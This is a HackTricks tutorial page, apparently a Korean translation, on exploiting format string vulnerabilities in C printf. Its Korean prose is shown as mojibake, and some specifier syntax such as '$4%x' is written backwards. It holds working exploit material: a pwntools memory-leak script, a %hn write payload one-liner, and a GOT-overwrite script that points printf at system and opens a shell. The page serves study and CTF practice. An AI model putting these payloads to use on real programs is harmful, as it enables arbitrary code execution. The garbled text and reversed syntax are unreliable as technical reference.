# Format Strings

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Cì—ì„œ **`printf`**ëŠ” ë¬¸ìì—´ì„ **ì¶œë ¥**í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤. ì´ í•¨ìˆ˜ê°€ ê¸°ëŒ€í•˜ëŠ” **ì²« ë²ˆì§¸ ë§¤ê°œë³€ìˆ˜**ëŠ” **í˜•ì‹ ì§€ì •ìê°€ í¬í•¨ëœ ì›ì‹œ í…ìŠ¤íŠ¸**ì…ë‹ˆë‹¤. **ë‹¤ìŒ ë§¤ê°œë³€ìˆ˜**ëŠ” ì›ì‹œ í…ìŠ¤íŠ¸ì˜ **í˜•ì‹ ì§€ì •ì**ë¥¼ **ëŒ€ì²´í• ** **ê°’**ì…ë‹ˆë‹¤.

ì·¨ì•½ì ì€ **ê³µê²©ì í…ìŠ¤íŠ¸ê°€ ì´ í•¨ìˆ˜ì˜ ì²« ë²ˆì§¸ ì¸ìˆ˜ë¡œ ì‚¬ìš©ë  ë•Œ** ë‚˜íƒ€ë‚©ë‹ˆë‹¤. ê³µê²©ìëŠ” **printf í˜•ì‹** ë¬¸ìì—´ ê¸°ëŠ¥ì„ ì•…ìš©í•˜ì—¬ **íŠ¹ë³„í•œ ì…ë ¥ì„ ì¡°ì‘**í•˜ì—¬ **ì½ì„ ìˆ˜ ìˆëŠ”/ì“¸ ìˆ˜ ìˆëŠ”** ëª¨ë“  ì£¼ì†Œì˜ **ë°ì´í„°ë¥¼ ì½ê³  ì“¸ ìˆ˜** ìˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ì—¬ **ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### Formatters:
```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```
**ì˜ˆì‹œ:** 

* ì·¨ì•½í•œ ì˜ˆì‹œ:
```c
char buffer[30];
gets(buffer);  // Dangerous: takes user input without restrictions.
printf(buffer);  // If buffer contains "%x", it reads from the stack.
```
* ì¼ë°˜ ì‚¬ìš©:
```c
int value = 1205;
printf("%x %x %x", value, value, value);  // Outputs: 4b5 4b5 4b5
```
* ì¸ìˆ˜ê°€ ëˆ„ë½ëœ ê²½ìš°:
```c
printf("%x %x %x", value);  // Unexpected output: reads random values from the stack.
```
### **í¬ì¸í„° ì ‘ê·¼**

í˜•ì‹ **`%<n>$x`**, ì—¬ê¸°ì„œ `n`ì€ ìˆ«ì,ëŠ” printfì—ê²Œ ìŠ¤íƒì—ì„œ në²ˆì§¸ ë§¤ê°œë³€ìˆ˜ë¥¼ ì„ íƒí•˜ë„ë¡ ì§€ì‹œí•©ë‹ˆë‹¤. ë”°ë¼ì„œ printfë¥¼ ì‚¬ìš©í•˜ì—¬ ìŠ¤íƒì—ì„œ 4ë²ˆì§¸ ë§¤ê°œë³€ìˆ˜ë¥¼ ì½ê³  ì‹¶ë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì´ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```c
printf("%x %x %x %x")
```
ê·¸ë¦¬ê³  ì²« ë²ˆì§¸ë¶€í„° ë„¤ ë²ˆì§¸ ë§¤ê°œë³€ìˆ˜ê¹Œì§€ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜ëŠ” ë‹¤ìŒê³¼ ê°™ì´ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```c
printf("$4%x")
```
and read directly the forth.

Notice that the attacker controls the `pr`**`intf` ë§¤ê°œë³€ìˆ˜, ì´ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ** ê·¸ì˜ ì…ë ¥ì´ `printf`ê°€ í˜¸ì¶œë  ë•Œ ìŠ¤íƒì— ìˆì„ ê²ƒì„ì„ ì˜ë¯¸í•˜ë©°, ì´ëŠ” ê·¸ê°€ ìŠ¤íƒì— íŠ¹ì • ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ì“¸ ìˆ˜ ìˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

{% hint style="danger" %}
ì´ ì…ë ¥ì„ ì œì–´í•˜ëŠ” ê³µê²©ìëŠ” **ìŠ¤íƒì— ì„ì˜ì˜ ì£¼ì†Œë¥¼ ì¶”ê°€í•˜ê³  `printf`ê°€ ì´ë¥¼ ì ‘ê·¼í•˜ê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ë‹¤ìŒ ì„¹ì…˜ì—ì„œëŠ” ì´ ë™ì‘ì„ ì‚¬ìš©í•˜ëŠ” ë°©ë²•ì´ ì„¤ëª…ë  ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

## **ì„ì˜ ì½ê¸°**

í˜•ì‹ ì§€ì •ì **`$n%s`**ë¥¼ ì‚¬ìš©í•˜ì—¬ **`printf`**ê°€ **n ìœ„ì¹˜**ì— ìˆëŠ” **ì£¼ì†Œ**ë¥¼ ê°€ì ¸ì™€ì„œ **ë¬¸ìì—´ì²˜ëŸ¼ ì¶œë ¥**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(0x00ì´ ë°œê²¬ë  ë•Œê¹Œì§€ ì¶œë ¥). ë”°ë¼ì„œ ë°”ì´ë„ˆë¦¬ì˜ ê¸°ë³¸ ì£¼ì†Œê°€ **`0x8048000`**ì´ê³ , ì‚¬ìš©ì ì…ë ¥ì´ ìŠ¤íƒì˜ 4ë²ˆì§¸ ìœ„ì¹˜ì—ì„œ ì‹œì‘ëœë‹¤ëŠ” ê²ƒì„ ì•Œê³  ìˆë‹¤ë©´, ë‹¤ìŒê³¼ ê°™ì´ ë°”ì´ë„ˆë¦¬ì˜ ì‹œì‘ ë¶€ë¶„ì„ ì¶œë ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
from pwn import *

p = process('./bin')

payload = b'%6$p' #4th param
payload += b'xxxx' #5th param (needed to fill 8bytes with the initial input)
payload += p32(0x8048000) #6th param

p.sendline(payload)
log.info(p.clean()) # b'\x7fELF\x01\x01\x01||||'
```
{% hint style="danger" %}
ì…ë ¥ì˜ ì‹œì‘ ë¶€ë¶„ì— ì£¼ì†Œ 0x8048000ì„ ë„£ì„ ìˆ˜ ì—†ë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”. ê·¸ ì£¼ì†Œì˜ ëì—ì„œ ë¬¸ìì—´ì´ 0x00ìœ¼ë¡œ ì˜ë¦¬ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.
{% endhint %}

## **ì„ì˜ ì“°ê¸°**

í¬ë§·í„° **`$<num>%n`**ì€ ìŠ¤íƒì˜ \<num> ë§¤ê°œë³€ìˆ˜ì— ìˆëŠ” **ì§€ì •ëœ ì£¼ì†Œ**ì— **ì“°ê¸° ë°”ì´íŠ¸ ìˆ˜**ë¥¼ **ì‘ì„±**í•©ë‹ˆë‹¤. ê³µê²©ìê°€ printfë¥¼ ì‚¬ìš©í•˜ì—¬ ì›í•˜ëŠ” ë§Œí¼ì˜ ë¬¸ìë¥¼ ì“¸ ìˆ˜ ìˆë‹¤ë©´, ê·¸ëŠ” **`$<num>%n`**ì„ ì‚¬ìš©í•˜ì—¬ ì„ì˜ì˜ ì£¼ì†Œì— ì„ì˜ì˜ ìˆ«ìë¥¼ ì“¸ ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.

ë‹¤í–‰íˆë„, ìˆ«ì 9999ë¥¼ ì“°ê¸° ìœ„í•´ ì…ë ¥ì— 9999ê°œì˜ "A"ë¥¼ ì¶”ê°€í•  í•„ìš”ëŠ” ì—†ìŠµë‹ˆë‹¤. ê·¸ë ‡ê²Œ í•˜ê¸° ìœ„í•´ í¬ë§·í„° **`%.<num-write>%<num>$n`**ì„ ì‚¬ìš©í•˜ì—¬ **`<num-write>`** ìˆ«ìë¥¼ **`num` ìœ„ì¹˜ê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œ**ì— ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```
ê·¸ëŸ¬ë‚˜ ì¼ë°˜ì ìœ¼ë¡œ `0x08049724`ì™€ ê°™ì€ ì£¼ì†Œë¥¼ ì“°ê¸° ìœ„í•´ì„œëŠ” (í•œ ë²ˆì— ì“°ê¸°ì—ëŠ” ë§¤ìš° í° ìˆ«ìì…ë‹ˆë‹¤), **`$hn`**ì´ **`$n`** ëŒ€ì‹  ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ **2ë°”ì´íŠ¸ë§Œ ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ ì´ ì‘ì—…ì€ ì£¼ì†Œì˜ ê°€ì¥ ë†’ì€ 2ë°”ì´íŠ¸ì™€ ê°€ì¥ ë‚®ì€ 2ë°”ì´íŠ¸ë¥¼ ìœ„í•´ ê°ê° ë‘ ë²ˆ ìˆ˜í–‰ë©ë‹ˆë‹¤.

ë”°ë¼ì„œ ì´ ì·¨ì•½ì ì€ **ì„ì˜ì˜ ì£¼ì†Œì— ë¬´ì—‡ì´ë“  ì“¸ ìˆ˜ ìˆê²Œ** í•©ë‹ˆë‹¤.

ì´ ì˜ˆì œì˜ ëª©í‘œëŠ” **ë‚˜ì¤‘ì— í˜¸ì¶œë ** **í•¨ìˆ˜**ì˜ **ì£¼ì†Œ**ë¥¼ **ë®ì–´ì“°ëŠ” ê²ƒ**ì…ë‹ˆë‹¤. ë¹„ë¡ ì´ê²ƒì´ ë‹¤ë¥¸ ì„ì˜ ì“°ê¸°ë¥¼ ì•…ìš©í•˜ì—¬ exec ê¸°ìˆ ì„ ì‚¬ìš©í•  ìˆ˜ ìˆì§€ë§Œ:

{% content-ref url="../arbitrary-write-2-exec/" %}
[arbitrary-write-2-exec](../arbitrary-write-2-exec/)
{% endcontent-ref %}

ìš°ë¦¬ëŠ” **ì‚¬ìš©ì**ë¡œë¶€í„° **ì¸ìˆ˜**ë¥¼ **ë°›ëŠ”** **í•¨ìˆ˜**ë¥¼ **ë®ì–´ì“°ê³ **, ì´ë¥¼ **`system`** **í•¨ìˆ˜**ë¥¼ ê°€ë¦¬í‚¤ë„ë¡ í•  ê²ƒì…ë‹ˆë‹¤.\
ì–¸ê¸‰í–ˆë“¯ì´ ì£¼ì†Œë¥¼ ì“°ê¸° ìœ„í•´ì„œëŠ” ì¼ë°˜ì ìœ¼ë¡œ 2ë‹¨ê³„ê°€ í•„ìš”í•©ë‹ˆë‹¤: ë¨¼ì € ì£¼ì†Œì˜ 2ë°”ì´íŠ¸ë¥¼ ì“°ê³ , ê·¸ ë‹¤ìŒì— ë‚˜ë¨¸ì§€ 2ë°”ì´íŠ¸ë¥¼ ì”ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ **`$hn`**ì´ ì‚¬ìš©ë©ë‹ˆë‹¤.

* **HOB**ëŠ” ì£¼ì†Œì˜ 2ê°œì˜ ë†’ì€ ë°”ì´íŠ¸ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.
* **LOB**ëŠ” ì£¼ì†Œì˜ 2ê°œì˜ ë‚®ì€ ë°”ì´íŠ¸ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.

ê·¸ëŸ° ë‹¤ìŒ, í¬ë§· ë¬¸ìì—´ì˜ ì‘ë™ ë°©ì‹ ë•Œë¬¸ì— **ë¨¼ì € ë” ì‘ì€** \[HOB, LOB]ë¥¼ ì“°ê³  ê·¸ ë‹¤ìŒì— ë‹¤ë¥¸ ê²ƒì„ ì¨ì•¼ í•©ë‹ˆë‹¤.

HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NÂºParam\_dir\_HOB LOB\_shell-HOB\_shell NÂºParam\_dir\_LOB

{% code overflow="wrap" %}
```bash
python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'
```
{% endcode %}

### Pwntools í…œí”Œë¦¿

ì´ëŸ¬í•œ ì¢…ë¥˜ì˜ ì·¨ì•½ì ì„ ìœ„í•œ ìµìŠ¤í”Œë¡œì‡ì„ ì¤€ë¹„í•˜ëŠ” í…œí”Œë¦¿ì€ ë‹¤ìŒì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

ë˜ëŠ” [**ì—¬ê¸°**](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite)ì—ì„œ ì´ ê¸°ë³¸ ì˜ˆì œë¥¼ í™•ì¸í•˜ì„¸ìš”:
```python
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7dc2000       # ASLR disabled

p = process()

payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()

p.sendline('/bin/sh')

p.interactive()
```
## ë‹¤ë¥¸ ì˜ˆì œ ë° ì°¸ê³ ìë£Œ

* [https://ir0nstone.gitbook.io/notes/types/stack/format-string](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
* [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)
* [https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html)
* 32ë¹„íŠ¸, no relro, no canary, nx, no pie, ìŠ¤íƒì—ì„œ í”Œë˜ê·¸ë¥¼ ëˆ„ì¶œí•˜ê¸° ìœ„í•œ format stringsì˜ ê¸°ë³¸ ì‚¬ìš© (ì‹¤í–‰ íë¦„ì„ ë³€ê²½í•  í•„ìš” ì—†ìŒ)
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32ë¹„íŠ¸, relro, no canary, nx, no pie, win í•¨ìˆ˜ë¡œ `fflush` ì£¼ì†Œë¥¼ ë®ì–´ì“°ëŠ” format string (ret2win)
* [https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html)
* 32ë¹„íŠ¸, relro, no canary, nx, no pie, `.fini_array` ë‚´ì˜ mainì— ì£¼ì†Œë¥¼ ì“°ê¸° ìœ„í•œ format string (íë¦„ì´ í•œ ë²ˆ ë” ë°˜ë³µë¨) ë° `strlen`ì„ ê°€ë¦¬í‚¤ëŠ” GOT í…Œì´ë¸”ì˜ `system` ì£¼ì†Œë¥¼ ì“°ê¸°. íë¦„ì´ mainìœ¼ë¡œ ëŒì•„ê°€ë©´, ì‚¬ìš©ì ì…ë ¥ìœ¼ë¡œ `strlen`ì´ ì‹¤í–‰ë˜ê³  `system`ì„ ê°€ë¦¬í‚¤ë©´, ì „ë‹¬ëœ ëª…ë ¹ì´ ì‹¤í–‰ë¨.

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
